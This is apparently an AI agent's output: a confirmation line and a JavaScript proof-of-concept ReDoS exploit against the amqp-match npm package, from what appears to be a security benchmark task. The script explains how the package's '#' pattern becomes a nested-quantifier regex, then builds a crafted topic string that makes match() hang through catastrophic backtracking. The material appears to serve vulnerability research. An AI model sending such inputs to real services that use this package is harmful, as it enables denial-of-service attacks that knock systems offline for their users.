@@ -1,0 +1,30 @@
+Confirmed: n=28 hangs past 20 seconds. Here's the exploit.
+
+```javascript
+// ReDoS exploit for amqp-match (module_03)
+// The `match(topic, pattern)` function builds a regex from an AMQP-style
+// pattern by replacing '#' with the evil, nested-quantifier fragment
+// '([^.]+.?)+' and then calls topic.search(regex).
+//
+// Because '[^.]+' and the optional '.?' can both consume ordinary
+// characters, there are exponentially many ways to partition a run of
+// non-dot characters between the repeated groups. When the string is
+// finally rejected (forced by two trailing dots that the required
+// '[^.]+' can never consume), the regex engine must explore all of
+// those partitions before giving up -> catastrophic backtracking.
+
+const match = require("./node_modules/amqp-match");
+
+// ~28 'a' characters is enough to make a single match() call hang
+// for a very long time (grows exponentially with each extra 'a').
+const evilTopic = "a".repeat(28) + "..";
+const pattern = "#";
+
+console.log("Starting match() - this should hang due to ReDoS...");
+console.time("match() duration");
+
+match(evilTopic, pattern); // never returns in practical time
+
+console.timeEnd("match() duration"); // never reached
+console.log("If you see this, the ReDoS did not trigger.");
+```
